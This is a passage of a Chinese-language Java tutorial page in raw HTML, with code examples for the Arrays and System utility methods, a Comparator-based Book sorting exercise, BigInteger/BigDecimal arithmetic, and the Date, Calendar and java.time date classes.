class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Integer[] arr = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">90</span>,<span class="hljs-number">123</span>,<span class="hljs-number">567</span>&#125;;<br><span class="hljs-comment">//binarySearch 通过二分搜索法进行查找，要求必须排好</span><br><span class="hljs-comment">//1.使用binarySearch二叉查找</span><br><span class="hljs-comment">//2.要求该数组是有序的，如果该数组是无序的，不能使用binarySearch</span><br><span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> Arrays.binarySearch(arr,<span class="hljs-number">123</span>);<br>System.out.println(<span class="hljs-string">&quot;index=&quot;</span>+index);<br></code></pre></td></tr></table></figure><p>1.使用binarySearch二叉查找<br>2.要求该数组是有序的，如果该数组是无序的，不能使用binarySearch<br>3.如果数组中不存在该元素，就返回-1</p><p><strong>4） copyOf 数组元素的复制</strong><br>Integer[] newArr &#x3D; Arrays.copyOf(arr, arr.length); </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//copyOf 数组元素的复制</span><br><span class="hljs-comment">//1.如果拷贝的长度 &gt; arr.length 就在新数组的后面，增加null</span><br><span class="hljs-comment">//2.如果拷贝长度 &lt; 0,就返回议程NegativeArraySizeException</span><br><span class="hljs-comment">//3.该方法的底层使用的是 System.arraycopy()</span><br>Integer[] newArr = Arrays.copyOf(arr, arr.length+<span class="hljs-number">1</span>);<br>System.out.println(<span class="hljs-string">&quot;拷贝如下：\n&quot;</span>+Arrays.toString(newArr));<br><span class="hljs-comment">//拷贝如下：</span><br><span class="hljs-comment">//[1, 2, 90, 123, 567, null]</span><br></code></pre></td></tr></table></figure><p><strong>5）fill 数组元素的填充</strong><br>Arrays.fill(num, 99);</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Integer[] num = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>[]&#123;<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>&#125;;<br>Arrays.fill(num,<span class="hljs-number">99</span>); <span class="hljs-comment">//使用99去填充num数组，可以理解成是替换原理的元素</span><br>System.out.println(<span class="hljs-string">&quot;num数组填充后：&quot;</span>+Arrays.toString(num));<br><br><span class="hljs-comment">//num数组填充后：[99, 99, 99]</span><br></code></pre></td></tr></table></figure><p><strong>6） equals 比较两个数组元素内容是否完全一致</strong></p><p>boolean equals &#x3D; Arrays.equals(arr, arr2);</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Integer[] arr1 = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">90</span>,<span class="hljs-number">123</span>,<span class="hljs-number">567</span>&#125;;<br>Integer[] arr2 = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">90</span>,<span class="hljs-number">123</span>,<span class="hljs-number">567</span>&#125;;<br><span class="hljs-type">boolean</span> <span class="hljs-variable">equals</span> <span class="hljs-operator">=</span> Arrays.equals(arr1,arr2);<br>System.out.println(equals);<br><span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><p>相同返回true，不相同返回false。</p><p><strong>7） asList 将一组值，转换成list</strong><br>List<Integer> asList &#x3D; Arrays.asList(2,3,4,5,6,1); System.out.println(“asList&#x3D;” + asList);</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">List</span> <span class="hljs-variable">asList</span> <span class="hljs-operator">=</span> Arrays.asList(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>);<br>System.out.println(<span class="hljs-string">&quot;asList=&quot;</span> + asList);<br></code></pre></td></tr></table></figure><h3 id="Arrays类课堂练习"><a href="#Arrays类课堂练习" class="headerlink" title="Arrays类课堂练习"></a>Arrays类课堂练习</h3><p>案例：自定义Book类，里面包含name和price，按price排序（从小到大）。要求使用两种方式排序，对对象的某个属性排序，有一个Book［］ books ＝ 5本书对象．<br>使用前面学习过的传递实现Comparator接口匿名内部类，也称为定制排序。</p><blockquote><p>Book[] books &#x3D; new Book[4];</p><p>books［0］ ＝ new Book（＂红楼梦～＂， 100）；</p><p>books［1］ ＝ new Book（＂金瓶梅～＂， 90）；</p><p>books［2］ ＝ new Book（＂青年文摘～＂， 5）；</p><p>books［3］ ＝ new Book（＂java从入门到放弃～＂， 300）；</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayExercise</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        Book[] books = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>[<span class="hljs-number">4</span>];<br>        books[<span class="hljs-number">0</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-string">&quot;红楼梦&quot;</span>,<span class="hljs-number">100</span>);<br>        books[<span class="hljs-number">1</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-string">&quot;金瓶梅&quot;</span>,<span class="hljs-number">90</span>);<br>        books[<span class="hljs-number">2</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-string">&quot;青年文摘&quot;</span>,<span class="hljs-number">5</span>);<br>        books[<span class="hljs-number">3</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-string">&quot;java从入门到放弃&quot;</span>,<span class="hljs-number">300</span>);<br><br>        Arrays.sort(books, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>() &#123;<br>            <span class="hljs-comment">//这里是对Book数组排序，因此o1和o2就是book对象</span><br>            <span class="hljs-comment">//按price排序（从小到大）</span><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object o1, Object o2)</span> &#123;<br>                <span class="hljs-type">Book</span> <span class="hljs-variable">book1</span> <span class="hljs-operator">=</span> (Book) o1;<br>                <span class="hljs-type">Book</span> <span class="hljs-variable">book2</span> <span class="hljs-operator">=</span> (Book) o2;<br>                <span class="hljs-type">double</span> <span class="hljs-variable">priceVal</span> <span class="hljs-operator">=</span> book2.getPrice() - book1.getPrice();<br>                <span class="hljs-keyword">if</span> (priceVal &gt; <span class="hljs-number">0</span>)&#123;<br>                    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>; <span class="hljs-comment">//负数即可</span><br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (priceVal &lt;<span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <br>                &#125; <span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>                &#125;<br>            &#125;<br>        &#125;);<br>        <span class="hljs-comment">//  输出</span><br>        System.out.println(Arrays.toString(books));<br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Book</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> price;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Book</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> price)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.price = price;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getPrice</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> price;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPrice</span><span class="hljs-params">(<span class="hljs-type">int</span> price)</span> &#123;<br>        <span class="hljs-built_in">this</span>.price = price;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Book&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, price=&quot;</span> + price +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>输出：</p><p>[Book{name&#x3D;’青年文摘’, price&#x3D;5}, </p><p>Book{name&#x3D;’金瓶梅’, price&#x3D;90}, </p><p>Book{name&#x3D;’红楼梦’, price&#x3D;100}, </p><p>Book{name&#x3D;’java从入门到放弃’, price&#x3D;300}]</p><p>按照书名长度排序（长到短）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object o1, Object o2)</span> &#123;<br>    <span class="hljs-type">Book</span> <span class="hljs-variable">book1</span> <span class="hljs-operator">=</span> (Book) o1;<br>    <span class="hljs-type">Book</span> <span class="hljs-variable">book2</span> <span class="hljs-operator">=</span> (Book) o2;<br>    <span class="hljs-keyword">return</span> book2.getName().length() - book1.getName().length();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-System类"><a href="#6-System类" class="headerlink" title="6.System类"></a>6.System类</h2><p><strong>1）exit 退出当前程序</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">System.exit(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>exit(0)表示状态，0为正常状态。</p><p><strong>2）arraycopy：复制数组元素，比较适合底层调用</strong>，一般使用 <strong>Arrays.copyOf</strong>完成复制数组。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">System.arraycopy(src, srcPos, dest, destPos, length);<br><span class="hljs-comment">//src：源数组</span><br><span class="hljs-comment">//srcPos: 从源数组的哪个索引开始拷贝</span><br><span class="hljs-comment">//dest:目标数组</span><br><span class="hljs-comment">//destPos：把源数组的数据拷贝到 目标数组的哪个索引</span><br><span class="hljs-comment">//length：从源数组拷贝的数组个数</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] src = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;;<br><span class="hljs-type">int</span>[] dest = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>]; <span class="hljs-comment">//dest当前是&#123;0,0,0&#125;</span><br>System.arraycopy(src,<span class="hljs-number">0</span>,dest,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>);<br>System.out.println(<span class="hljs-string">&quot;dest=&quot;</span>+ Arrays.toString(dest));<br><span class="hljs-comment">//dest=[1, 2, 3]</span><br></code></pre></td></tr></table></figure><p><strong>3） currentTimeMillens：返回当前时间距离1970-1-1的毫秒数</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(System.currentTimeMillis());<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221118202731626.png" alt="image-20221118202731626"></p><p><strong>4）gc：运行垃圾回收机制 System.gc()；</strong></p><h2 id="7-BigInteger-amp-BigDecimal类"><a href="#7-BigInteger-amp-BigDecimal类" class="headerlink" title="7.BigInteger&amp;BigDecimal类"></a>7.BigInteger&amp;BigDecimal类</h2><p>BigInteger适合保存较大的整型。</p><p>BigDecimal适合保存精度更高的浮点型（小数）。</p><p>【底层当做字符串处理】</p><h3 id="BigInteger"><a href="#BigInteger" class="headerlink" title="BigInteger"></a>BigInteger</h3><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">BigInteger</span> <span class="hljs-variable">bigInteger</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;2378888888888888888&quot;</span>);<br>System.out.println(bigInteger);<br></code></pre></td></tr></table></figure><p>可正常输出。</p><p>但加减乘除并不能直接使用运算符，需要调用对应的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">BigInteger</span> <span class="hljs-variable">bigInteger</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;2378888888888888888&quot;</span>);<br><span class="hljs-type">BigInteger</span> <span class="hljs-variable">bigInteger2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;100&quot;</span>);<br>System.out.println(bigInteger);<br><span class="hljs-type">BigInteger</span> <span class="hljs-variable">add</span> <span class="hljs-operator">=</span> bigInteger.add(bigInteger2); <span class="hljs-comment">//相加</span><br>System.out.println(add);<br></code></pre></td></tr></table></figure><p>输出：</p><p>2378888888888888888<br>2378888888888888988</p><p>有加减乘除四个方法，add、subtract、multiply、divide。</p><h3 id="BigDecimal"><a href="#BigDecimal" class="headerlink" title="BigDecimal"></a>BigDecimal</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">BigDecimal</span> <span class="hljs-variable">bigDecimal</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">&quot;1999.111111111111111111111111&quot;</span>);<br><span class="hljs-type">BigDecimal</span> <span class="hljs-variable">bigDecimal2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">&quot;1.1&quot;</span>);<br></code></pre></td></tr></table></figure><p>BigDecimal的加减乘除也需要调用方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(bigDecimal.add(bigDecimal2));<br>System.out.println(bigDecimal.subtract(bigDecimal2));<br>System.out.println(bigDecimal.multiply(bigDecimal2));<br>System.out.println(bigDecimal.divide(bigDecimal2)); <span class="hljs-comment">//可能会抛出异常</span><br></code></pre></td></tr></table></figure><p>divide可能会抛出异常（无法除尽时），可以加上精度，例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(bigDecimal.divide(bigDecimal2, BigDecimal.ROUND_CEILING)); <br></code></pre></td></tr></table></figure><h2 id="8-Date（了解）"><a href="#8-Date（了解）" class="headerlink" title="8.Date（了解）"></a>8.Date（了解）</h2><h3 id="第一代日期类——Date"><a href="#第一代日期类——Date" class="headerlink" title="第一代日期类——Date"></a>第一代日期类——Date</h3><ol><li><p>Date:精确到毫秒，代表特定的时间</p></li><li><p>SimpleDateFormat：格式和解析日期的具体类。</p><p>它允许格式化（日期-&gt;文本）、解析（文本-&gt;日期）和规范化</p><p>具体格式：</p></li></ol><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-02-26%20%E4%B8%8B%E5%8D%885.21.50.png" alt="截屏2023-02-26 下午5.21.50"></p><p>案例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Date</span> <span class="hljs-variable">date</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(); <span class="hljs-comment">//获取当前系统时间</span><br>System.out.println(date);<br><span class="hljs-comment">//默认输出的是国外的方式，通常需要转换格式</span><br><span class="hljs-comment">//通过SimpleDateFormat对象，可以制定相应格式</span><br><span class="hljs-type">SimpleDateFormat</span> <span class="hljs-variable">sdf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">&quot;yyyy年MM月dd日 hh:mm:ss E&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">format</span> <span class="hljs-operator">=</span> sdf.format(date);<br>System.out.println(format);<br><br><span class="hljs-comment">//通过制定毫秒数获取时间</span><br><span class="hljs-type">Date</span> <span class="hljs-variable">date1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-number">9234567</span>);<br>System.out.println(date1);<br><br><span class="hljs-comment">//可以把一个格式化的String 转成对应的Date</span><br><span class="hljs-comment">//得到的Date仍然是国外格式，如果希望制定格式，需要转换</span><br><span class="hljs-comment">//当String - &gt; Date时，sdf的格式需要跟给的String格式相同</span><br><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;2023年02月26日 05:24:30 星期日&quot;</span>;<br><span class="hljs-type">Date</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> sdf.parse(s);<br>System.out.println(parse);<br>System.out.println(sdf.format(parse));<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230226173136070.png" alt="image-20230226173136070" style="zoom:50%;" /><h3 id="第二代日期类——Calendar"><a href="#第二代日期类——Calendar" class="headerlink" title="第二代日期类——Calendar"></a>第二代日期类——Calendar</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calendar</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>, Cloneable, Comparable&lt;Calendar&gt; <br></code></pre></td></tr></table></figure><p>Calendar 类是一个抽象类，它为特定瞬间与一组诸如 YEAR、MONTH、 DAY ＿OF＿MONTH、HOUR等<strong>日历字段</strong>之间的转换提供了一些方法，并为操作日历字段（例如获得下星期的日期）提供了一些方法。</p><ul><li>Calendar是一个抽象类，构造器时private。可以通过getInstance()来获取实例。</li><li>Calendar提供了大量的方法和字段供给使用。</li><li>Calendar没有专门的格式化方法，需要程序员自己组合</li><li>默认12小时制，若要24小时制获取时间，Calendar.HOUR改成Calendar.HOUR_OF_DAY</li></ul><p>案例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Calendar</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Calendar.getInstance(); <span class="hljs-comment">//因为私有，无法直接new</span><br>System.out.println(c);<br>System.out.println(<span class="hljs-string">&quot;年：&quot;</span> + c.get(Calendar.YEAR));<br><span class="hljs-comment">//这里的月份，默认从0开始</span><br>System.out.println(<span class="hljs-string">&quot;月：&quot;</span> + (c.get(Calendar.MONTH)+<span class="hljs-number">1</span>)); <br>System.out.println(<span class="hljs-string">&quot;日：&quot;</span> + c.get(Calendar.DAY_OF_MONTH));<br>System.out.println(<span class="hljs-string">&quot;小时：&quot;</span> + c.get(Calendar.HOUR));<br>System.out.println(<span class="hljs-string">&quot;分钟：&quot;</span> + c.get(Calendar.MINUTE));<br>System.out.println(<span class="hljs-string">&quot;秒：&quot;</span>+ c.get(Calendar.SECOND));<br></code></pre></td></tr></table></figure><p>输出：</p><p>java.util.GregorianCalendar[time&#x3D;1677405632967,areFieldsSet&#x3D;true,areAllFieldsSet&#x3D;true,lenient&#x3D;true,zone&#x3D;sun.util.calendar.ZoneInfo[id&#x3D;”Asia&#x2F;Shanghai”,offset&#x3D;28800000,dstSavings&#x3D;0,useDaylight&#x3D;false,transitions&#x3D;29,lastRule&#x3D;null],firstDayOfWeek&#x3D;1,minimalDaysInFirstWeek&#x3D;1,ERA&#x3D;1,YEAR&#x3D;2023,MONTH&#x3D;1,WEEK_OF_YEAR&#x3D;9,WEEK_OF_MONTH&#x3D;5,DAY_OF_MONTH&#x3D;26,DAY_OF_YEAR&#x3D;57,DAY_OF_WEEK&#x3D;1,DAY_OF_WEEK_IN_MONTH&#x3D;4,AM_PM&#x3D;1,HOUR&#x3D;6,HOUR_OF_DAY&#x3D;18,MINUTE&#x3D;0,SECOND&#x3D;32,MILLISECOND&#x3D;967,ZONE_OFFSET&#x3D;28800000,DST_OFFSET&#x3D;0]<br>年：2023<br>月：2<br>日：26<br>小时：6<br>分钟：0<br>秒：32</p><h3 id="第三代日期类——JDK8后"><a href="#第三代日期类——JDK8后" class="headerlink" title="第三代日期类——JDK8后"></a>第三代日期类——JDK8后</h3><p><strong>前面两代日期类的不足分析</strong>：<br>JDK 1.0中包含了一个java.util.Date类，但是它的大多数方法已经在JDK 1.1引入Calendar类之后被弃用了。而Calendar也存在问题是：<br>1）可变性：像日期和时间这样的类应该是不可变的。<br>2）偏移性：Date中的年份是从1900开始的，而月份都从0开始。<br>3）格式化：格式化只对Date有用，Calendar则不行。<br>4）此外，它们也不是线程安全的；不能处理闰秒等（每隔2天，多出1s）。</p><h4 id="第三代日期类常见方法："><a href="#第三代日期类常见方法：" class="headerlink" title="第三代日期类常见方法："></a><strong>第三代日期类常见方法：</strong></h4><ol><li>LocalDate（日期&#x2F;年月日）</li><li>LocalTime（时间&#x2F;时分秒）</li><li>LocalDateTime（日期时间&#x2F;年月日时分秒）</li></ol><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230226182417321.png" alt="image-20230226182417321" style="zoom:50%;" /><p>案例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">ldt</span> <span class="hljs-operator">=</span> LocalDateTime.now();<br>System.out.println(ldt);<br>System.out.println(<span class="hljs-string">&quot;年=&quot;</span>+ldt.getYear());<br>System.out.println(<span class="hljs-string">&quot;月=&quot;</span>+ldt.getMonth());<br>System.out.println(<span class="hljs-string">&quot;月=&quot;</span>+ldt.getMonthValue());<br>System.out.println(<span class="hljs-string">&quot;日=&quot;</span>+ldt.getDayOfMonth());<br>System.out.println(<span class="hljs-string">&quot;时=&quot;</span>+ldt.getHour());<br>System.out.println(<span class="hljs-string">&quot;分=&quot;</span>+ldt.getMinute());<br>System.out.println(<span class="hljs-string">&quot;秒=&quot;</span>+ldt.getSecond());<br></code></pre></td></tr></table></figure><p>输出：</p><p>2023-02-26T18:29:11.520<br>年&#x3D;2023<br>月&#x3D;FEBRUARY<br>月&#x3D;2<br>日&#x3D;26<br>时&#x3D;18<br>分&#x3D;29<br>秒&#x3D;11</p><p>如果只要获取年月日，使用LocalDate</p><p>如果只要时间，使用LocalTime</p><h4 id="DateTimeFormatter格式化"><a href="#DateTimeFormatter格式化" class="headerlink" title="DateTimeFormatter格式化"></a>DateTimeFormatter格式化</h4><p>详细参数可参考jdk8文档。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//创建DateTimeFormatter对象</span><br><span class="hljs-type">DateTimeFormatter</span> <span class="hljs-variable">dateTimeFormatter</span> <span class="hljs-operator">=</span> DateTimeFormatter.ofPattern(<span class="hljs-string">&quot;yyyy年MM月dd日 HH:mm:ss&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">format</span> <span class="hljs-operator">=</span> dateTimeFormatter.format(ldt);<br>System.out.println(<span class="hljs-string">&quot;格式化的日期=&quot;</span> + format);<br></code></pre></td></tr></table></figure><p>输出：格式化的日期&#x3D;2023年02月26日 18:37:16</p><h4 id="Instance时间戳"><a href="#Instance时间戳" class="headerlink" title="Instance时间戳"></a>Instance时间戳</h4><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230226183944829.png" alt="image-20230226183944829" style="zoom:50%;" /><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//1.通过静态方法now（）获取，表示当前时间戳的对象</span><br><span class="hljs-type">Instant</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> Instant.now();<br>System.out.println(now);<br><span class="hljs-comment">//2.通过from可以把Instance 转成Date</span><br><span class="hljs-type">Date</span> <span class="hljs-variable">date</span> <span class="hljs-operator">=</span> Date.from(now);<br><span class="hljs-comment">//3.通过date的toInstant（）可以把date转成Instance</span><br><span class="hljs-type">Instant</span> <span class="hljs-variable">instant</span> <span class="hljs-operator">=</span> date.toInstant();<br></code></pre></td></tr></table></figure><h4 id="第三代日期类更多方法"><a href="#第三代日期类更多方法" class="headerlink" title="第三代日期类更多方法"></a>第三代日期类更多方法</h4><ul><li><p>LocalDateTime类</p></li><li><p>MonthDay类：检查重复事件</p></li><li><p>是否是闰年</p></li><li><p>增加日期的某个部分</p></li><li><p>使用plus方法测试增加时间的某个部分</p><p>例如：xxx.plusDays(100);</p></li><li><p>使用minus方法测试查看一年前和一年后的日期</p><p>例如：xxx.minusMinutes(3456); 3456分钟前的时间</p></li></ul><h2 id="本章作业-1"><a href="#本章作业-1" class="headerlink" title="本章作业"></a>本章作业</h2><h3 id="题目1-4"><a href="#题目1-4" class="headerlink" 